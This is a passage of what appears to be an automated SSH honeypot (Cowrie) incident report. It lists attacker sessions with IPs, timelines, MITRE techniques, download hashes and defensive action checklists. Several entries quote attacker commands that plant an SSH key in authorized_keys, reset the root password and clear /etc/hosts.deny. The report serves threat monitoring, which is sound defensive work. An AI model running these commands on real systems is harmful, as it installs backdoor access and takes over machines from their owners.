- [ ] Block `104.28.233[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeaf0ad5cd52

| Field | Detail |
|---|---|
| **Source IP** | `104.28.233[.]73` |
| **First Seen** | 2026-06-01 05:48 |
| **Last Seen** | 2026-06-01 05:48 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:cHIOVvmDm6m5"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:48:24` | `cowrie.session.connect` |
| `2026-06-01 05:48:24` | `cowrie.client.version` |
| `2026-06-01 05:48:24` | `cowrie.client.kex` |
| `2026-06-01 05:48:25` | `cowrie.login.success` |
| `2026-06-01 05:48:26` | `cowrie.session.params` |
| `2026-06-01 05:48:26` | `cowrie.command.input` |
| `2026-06-01 05:48:26` | `cowrie.command.failed` |
| `2026-06-01 05:48:26` | `cowrie.log.closed` |
| `2026-06-01 05:48:27` | `cowrie.session.params` |
| `2026-06-01 05:48:27` | `cowrie.command.input` |
| `2026-06-01 05:48:27` | `cowrie.session.file_download` |
| `2026-06-01 05:48:27` | `cowrie.log.closed` |
| `2026-06-01 05:48:38` | `cowrie.session.params` |
| `2026-06-01 05:48:38` | `cowrie.command.input` |
| `2026-06-01 05:48:38` | `cowrie.log.closed` |
| `2026-06-01 05:48:39` | `cowrie.session.params` |
| `2026-06-01 05:48:39` | `cowrie.command.input` |
| `2026-06-01 05:48:39` | `cowrie.log.closed` |
| `2026-06-01 05:48:39` | `cowrie.session.params` |
| `2026-06-01 05:48:39` | `cowrie.command.input` |
| `2026-06-01 05:48:40` | `cowrie.session.file_download` |
| `2026-06-01 05:48:40` | `cowrie.log.closed` |
| `2026-06-01 05:48:40` | `cowrie.session.params` |
| `2026-06-01 05:48:40` | `cowrie.command.input` |
| `2026-06-01 05:48:41` | `cowrie.log.closed` |
| `2026-06-01 05:48:41` | `cowrie.session.params` |
| `2026-06-01 05:48:41` | `cowrie.command.input` |
| `2026-06-01 05:48:41` | `cowrie.log.closed` |
| `2026-06-01 05:48:42` | `cowrie.session.params` |
| `2026-06-01 05:48:42` | `cowrie.command.input` |
| `2026-06-01 05:48:42` | `cowrie.command.input` |
| `2026-06-01 05:48:42` | `cowrie.log.closed` |
| `2026-06-01 05:48:43` | `cowrie.session.params` |
| `2026-06-01 05:48:43` | `cowrie.command.input` |
| `2026-06-01 05:48:43` | `cowrie.log.closed` |
| `2026-06-01 05:48:43` | `cowrie.session.params` |
| `2026-06-01 05:48:43` | `cowrie.command.input` |
| `2026-06-01 05:48:44` | `cowrie.log.closed` |
| `2026-06-01 05:48:44` | `cowrie.session.params` |
| `2026-06-01 05:48:44` | `cowrie.command.input` |
| `2026-06-01 05:48:45` | `cowrie.log.closed` |
| `2026-06-01 05:48:45` | `cowrie.session.params` |
| `2026-06-01 05:48:45` | `cowrie.command.input` |
| `2026-06-01 05:48:45` | `cowrie.log.closed` |
| `2026-06-01 05:48:46` | `cowrie.session.params` |
| `2026-06-01 05:48:46` | `cowrie.command.input` |
| `2026-06-01 05:48:46` | `cowrie.log.closed` |
| `2026-06-01 05:48:46` | `cowrie.session.params` |
| `2026-06-01 05:48:46` | `cowrie.command.input` |
| `2026-06-01 05:48:47` | `cowrie.log.closed` |
| `2026-06-01 05:48:47` | `cowrie.session.params` |
| `2026-06-01 05:48:47` | `cowrie.command.input` |
| `2026-06-01 05:48:48` | `cowrie.log.closed` |
| `2026-06-01 05:48:48` | `cowrie.session.params` |
| `2026-06-01 05:48:48` | `cowrie.command.input` |
| `2026-06-01 05:48:48` | `cowrie.log.closed` |
| `2026-06-01 05:48:49` | `cowrie.session.params` |
| `2026-06-01 05:48:49` | `cowrie.command.input` |
| `2026-06-01 05:48:49` | `cowrie.log.closed` |
| `2026-06-01 05:48:49` | `cowrie.session.params` |
| `2026-06-01 05:48:49` | `cowrie.command.input` |
| `2026-06-01 05:48:50` | `cowrie.log.closed` |
| `2026-06-01 05:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.28.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `104.28.233[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e9023e3d0d6

| Field | Detail |
|---|---|
| **Source IP** | `172.191.151[.]49` |
| **First Seen** | 2026-06-01 05:57 |
| **Last Seen** | 2026-06-01 05:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ssh -V` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:57:02` | `cowrie.session.connect` |
| `2026-06-01 05:57:03` | `cowrie.client.version` |
| `2026-06-01 05:57:03` | `cowrie.client.kex` |
| `2026-06-01 05:57:07` | `cowrie.login.success` |
| `2026-06-01 05:57:09` | `cowrie.session.params` |
| `2026-06-01 05:57:09` | `cowrie.command.input` |
| `2026-06-01 05:57:10` | `cowrie.log.closed` |
| `2026-06-01 05:57:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `172.191.151[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7e189707fce

| Field | Detail |
|---|---|
| **Source IP** | `172.191.151[.]49` |
| **First Seen** | 2026-06-01 06:10 |
| **Last Seen** | 2026-06-01 06:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 06:10:15` | `cowrie.session.connect` |
| `2026-06-01 06:10:15` | `cowrie.client.version` |
| `2026-06-01 06:10:16` | `cowrie.client.kex` |
| `2026-06-01 06:10:16` | `cowrie.login.success` |
| `2026-06-01 06:10:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `172.191.151[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9350883a1a10

| Field | Detail |
|---|---|
| **Source IP** | `172.191.151[.]49` |
| **First Seen** | 2026-06-01 06:24 |
| **Last Seen** | 2026-06-01 06:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 06:24:06` | `cowrie.session.connect` |
| `2026-06-01 06:24:06` | `cowrie.client.version` |
| `2026-06-01 06:24:06` | `cowrie.client.kex` |
| `2026-06-01 06:24:07` | `cowrie.login.success` |
| `2026-06-01 06:24:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `172.191.151[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dc8cb74f01d

| Field | Detail |
|---|---|
| **Source IP** | `116.125.120[.]27` |
| **First Seen** | 2026-06-01 06:42 |
| **Last Seen** | 2026-06-01 06:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 06:42:11` | `cowrie.session.connect` |
| `2026-06-01 06:42:11` | `cowrie.client.version` |
| `2026-06-01 06:42:11` | `cowrie.client.kex` |
| `2026-06-01 06:42:11` | `cowrie.login.success` |
| `2026-06-01 06:42:12` | `cowrie.session.params` |
| `2026-06-01 06:42:12` | `cowrie.command.input` |
| `2026-06-01 06:42:12` | `cowrie.command.failed` |
| `2026-06-01 06:42:12` | `cowrie.log.closed` |
| `2026-06-01 06:42:12` | `cowrie.session.params` |
| `2026-06-01 06:42:12` | `cowrie.command.input` |
| `2026-06-01 06:42:12` | `cowrie.session.file_download` |
| `2026-06-01 06:42:12` | `cowrie.log.closed` |
| `2026-06-01 06:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.125.120[.]27` to AbuseIPDB if not already reported
- [ ] Block `116.125.120[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fd0a5b7124f

| Field | Detail |
|---|---|
| **Source IP** | `116.125.120[.]27` |
| **First Seen** | 2026-06-01 06:42 |
| **Last Seen** | 2026-06-01 06:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 06:42:14` | `cowrie.session.connect` |
| `2026-06-01 06:42:14` | `cowrie.client.version` |
| `2026-06-01 06:42:14` | `cowrie.client.kex` |
| `2026-06-01 06:42:15` | `cowrie.login.success` |
| `2026-06-01 06:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.125.120[.]27` to AbuseIPDB if not already reported
- [ ] Block `116.125.120[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69baf4faba33

| Field | Detail |
|---|---|
| **Source IP** | `120.48.22[.]91` |
| **First Seen** | 2026-06-01 06:49 |
| **Last Seen** | 2026-06-01 06:54 |
| **Session Duration** | 318s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 06:49:35` | `cowrie.session.connect` |
| `2026-06-01 06:49:37` | `cowrie.client.version` |
| `2026-06-01 06:49:39` | `cowrie.client.kex` |
| `2026-06-01 06:49:53` | `cowrie.login.success` |
| `2026-06-01 06:54:53` | `cowrie.session.file_upload` |
| `2026-06-01 06:54:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.22[.]91` to AbuseIPDB if not already reported
- [ ] Block `120.48.22[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf14fb8e28dd

| Field | Detail |
|---|---|
| **Source IP** | `138.197.200[.]106` |
| **First Seen** | 2026-06-01 07:03 |
| **Last Seen** | 2026-06-01 07:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:03:43` | `cowrie.session.connect` |
| `2026-06-01 07:03:43` | `cowrie.client.version` |
| `2026-06-01 07:03:43` | `cowrie.client.kex` |
| `2026-06-01 07:03:44` | `cowrie.login.success` |
| `2026-06-01 07:03:45` | `cowrie.session.params` |
| `2026-06-01 07:03:45` | `cowrie.command.input` |
| `2026-06-01 07:03:45` | `cowrie.command.failed` |
| `2026-06-01 07:03:45` | `cowrie.log.closed` |
| `2026-06-01 07:03:45` | `cowrie.session.params` |
| `2026-06-01 07:03:45` | `cowrie.command.input` |
| `2026-06-01 07:03:46` | `cowrie.session.file_download` |
| `2026-06-01 07:03:46` | `cowrie.log.closed` |
| `2026-06-01 07:03:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.200[.]106` to AbuseIPDB if not already reported
- [ ] Block `138.197.200[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4634afe390b0

| Field | Detail |
|---|---|
| **Source IP** | `138.197.200[.]106` |
| **First Seen** | 2026-06-01 07:03 |
| **Last Seen** | 2026-06-01 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:03:49` | `cowrie.session.connect` |
| `2026-06-01 07:03:49` | `cowrie.client.version` |
| `2026-06-01 07:03:49` | `cowrie.client.kex` |
| `2026-06-01 07:03:50` | `cowrie.login.success` |
| `2026-06-01 07:03:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.200[.]106` to AbuseIPDB if not already reported
- [ ] Block `138.197.200[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c41cdc2eb4a

| Field | Detail |
|---|---|
| **Source IP** | `161.49.89[.]39` |
| **First Seen** | 2026-06-01 07:04 |
| **Last Seen** | 2026-06-01 07:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:04:07` | `cowrie.session.connect` |
| `2026-06-01 07:04:07` | `cowrie.client.version` |
| `2026-06-01 07:04:07` | `cowrie.client.kex` |
| `2026-06-01 07:04:07` | `cowrie.login.success` |
| `2026-06-01 07:04:07` | `cowrie.session.params` |
| `2026-06-01 07:04:07` | `cowrie.command.input` |
| `2026-06-01 07:04:07` | `cowrie.command.failed` |
| `2026-06-01 07:04:08` | `cowrie.log.closed` |
| `2026-06-01 07:04:08` | `cowrie.session.params` |
| `2026-06-01 07:04:08` | `cowrie.command.input` |
| `2026-06-01 07:04:08` | `cowrie.session.file_download` |
| `2026-06-01 07:04:08` | `cowrie.log.closed` |
| `2026-06-01 07:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.49.89[.]39` to AbuseIPDB if not already reported
- [ ] Block `161.49.89[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b13921e1f8d8

| Field | Detail |
|---|---|
| **Source IP** | `161.49.89[.]39` |
| **First Seen** | 2026-06-01 07:04 |
| **Last Seen** | 2026-06-01 07:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:04:10` | `cowrie.session.connect` |
| `2026-06-01 07:04:10` | `cowrie.client.version` |
| `2026-06-01 07:04:10` | `cowrie.client.kex` |
| `2026-06-01 07:04:10` | `cowrie.login.success` |
| `2026-06-01 07:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.49.89[.]39` to AbuseIPDB if not already reported
- [ ] Block `161.49.89[.]39` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6296c12cf1a5

| Field | Detail |
|---|---|
| **Source IP** | `121.15.140[.]235` |
| **First Seen** | 2026-06-01 07:05 |
| **Last Seen** | 2026-06-01 07:05 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:hV0qNxnvHI8h"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:05:24` | `cowrie.session.connect` |
| `2026-06-01 07:05:24` | `cowrie.client.version` |
| `2026-06-01 07:05:25` | `cowrie.client.kex` |
| `2026-06-01 07:05:26` | `cowrie.login.success` |
| `2026-06-01 07:05:26` | `cowrie.session.params` |
| `2026-06-01 07:05:26` | `cowrie.command.input` |
| `2026-06-01 07:05:26` | `cowrie.command.failed` |
| `2026-06-01 07:05:27` | `cowrie.log.closed` |
| `2026-06-01 07:05:28` | `cowrie.session.params` |
| `2026-06-01 07:05:28` | `cowrie.command.input` |
| `2026-06-01 07:05:28` | `cowrie.session.file_download` |
| `2026-06-01 07:05:28` | `cowrie.log.closed` |
| `2026-06-01 07:05:40` | `cowrie.session.params` |
| `2026-06-01 07:05:40` | `cowrie.command.input` |
| `2026-06-01 07:05:40` | `cowrie.log.closed` |
| `2026-06-01 07:05:41` | `cowrie.session.params` |
| `2026-06-01 07:05:41` | `cowrie.command.input` |
| `2026-06-01 07:05:41` | `cowrie.log.closed` |
| `2026-06-01 07:05:42` | `cowrie.session.params` |
| `2026-06-01 07:05:42` | `cowrie.command.input` |
| `2026-06-01 07:05:42` | `cowrie.session.file_download` |
| `2026-06-01 07:05:42` | `cowrie.log.closed` |
| `2026-06-01 07:05:43` | `cowrie.session.params` |
| `2026-06-01 07:05:43` | `cowrie.command.input` |
| `2026-06-01 07:05:43` | `cowrie.log.closed` |
| `2026-06-01 07:05:43` | `cowrie.session.params` |
| `2026-06-01 07:05:43` | `cowrie.command.input` |
| `2026-06-01 07:05:44` | `cowrie.log.closed` |
| `2026-06-01 07:05:44` | `cowrie.session.params` |
| `2026-06-01 07:05:44` | `cowrie.command.input` |
| `2026-06-01 07:05:44` | `cowrie.command.input` |
| `2026-06-01 07:05:44` | `cowrie.log.closed` |
| `2026-06-01 07:05:45` | `cowrie.session.params` |
| `2026-06-01 07:05:45` | `cowrie.command.input` |
| `2026-06-01 07:05:45` | `cowrie.log.closed` |
| `2026-06-01 07:05:46` | `cowrie.session.params` |
| `2026-06-01 07:05:46` | `cowrie.command.input` |
| `2026-06-01 07:05:46` | `cowrie.log.closed` |
| `2026-06-01 07:05:47` | `cowrie.session.params` |
| `2026-06-01 07:05:47` | `cowrie.command.input` |
| `2026-06-01 07:05:47` | `cowrie.log.closed` |
| `2026-06-01 07:05:47` | `cowrie.session.params` |
| `2026-06-01 07:05:47` | `cowrie.command.input` |
| `2026-06-01 07:05:48` | `cowrie.log.closed` |
| `2026-06-01 07:05:48` | `cowrie.session.params` |
| `2026-06-01 07:05:48` | `cowrie.command.input` |
| `2026-06-01 07:05:48` | `cowrie.log.closed` |
| `2026-06-01 07:05:49` | `cowrie.session.params` |
| `2026-06-01 07:05:49` | `cowrie.command.input` |
| `2026-06-01 07:05:49` | `cowrie.log.closed` |
| `2026-06-01 07:05:50` | `cowrie.session.params` |
| `2026-06-01 07:05:50` | `cowrie.command.input` |
| `2026-06-01 07:05:50` | `cowrie.log.closed` |
| `2026-06-01 07:05:51` | `cowrie.session.params` |
| `2026-06-01 07:05:51` | `cowrie.command.input` |
| `2026-06-01 07:05:51` | `cowrie.log.closed` |
| `2026-06-01 07:05:51` | `cowrie.session.params` |
| `2026-06-01 07:05:51` | `cowrie.command.input` |
| `2026-06-01 07:05:52` | `cowrie.log.closed` |
| `2026-06-01 07:05:52` | `cowrie.session.params` |
| `2026-06-01 07:05:52` | `cowrie.command.input` |
| `2026-06-01 07:05:53` | `cowrie.log.closed` |
| `2026-06-01 07:05:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.15.140[.]235` to AbuseIPDB if not already reported
- [ ] Block `121.15.140[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44d0465870f9

| Field | Detail |
|---|---|
| **Source IP** | `172.191.151[.]49` |
| **First Seen** | 2026-06-01 07:07 |
| **Last Seen** | 2026-06-01 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:07:23` | `cowrie.session.connect` |
| `2026-06-01 07:07:23` | `cowrie.client.version` |
| `2026-06-01 07:07:24` | `cowrie.client.kex` |
| `2026-06-01 07:07:24` | `cowrie.login.success` |
| `2026-06-01 07:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `172.191.151[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb1192909e47

| Field | Detail |
|---|---|
| **Source IP** | `121.15.140[.]235` |
| **First Seen** | 2026-06-01 07:07 |
| **Last Seen** | 2026-06-01 07:08 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:TQgjtEbNp1N4"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:07:57` | `cowrie.session.connect` |
| `2026-06-01 07:07:57` | `cowrie.client.version` |
| `2026-06-01 07:07:57` | `cowrie.client.kex` |
| `2026-06-01 07:07:59` | `cowrie.login.success` |
